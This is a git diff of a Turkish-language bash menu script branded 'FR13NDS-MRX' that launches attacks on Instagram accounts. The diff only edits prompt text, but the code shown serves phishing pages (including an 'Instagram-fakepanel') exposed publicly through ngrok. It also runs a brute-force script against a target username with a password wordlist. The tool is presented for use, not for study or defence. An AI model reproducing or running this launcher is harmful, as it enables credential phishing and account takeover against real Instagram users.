@@ -26,9 +26,9 @@ echo -e "\033[31;40;1m
 "
 echo -e "\033[32;40;1m                 ~~~FR13NDS-MRX~~~"
 echo ""
-read -p "İslem Numarası →" islem
+read -p "İslem Numarası →> " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
-        read -p "Port Giriniz →"port
+        read -p "Port Giriniz →> "port
         echo -e "\e[32mCode: insta01"
 	sleep 2
 	echo ""
@@ -38,14 +38,14 @@ if [[ $islem == 1 || $islem == 01 ]]; then
 	php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 2 || $islem == 02 ]]; then
         cd  Instagram-bruteforce/
-        read -p "Hedef Kullanıcının Username →" username
+        read -p "Hedef Kullanıcının Username →> " username
         echo ""
-        read -p "Wordlist'in Bulunduğu Dizin →" password
+        read -p "Wordlist'in Bulunduğu Dizin →> " password
         python3 instagram.py $username $password -m 3
 
 elif [[ $islem == 3 || $islem == 03 ]]; then
         site="Instagram-fakepanel/"
-        read -p "Port Giriniz →" port
+        read -p "Port Giriniz →> " port
         echo -e "\e[32mCode: insta02"
 	sleep 2
 	echo ""
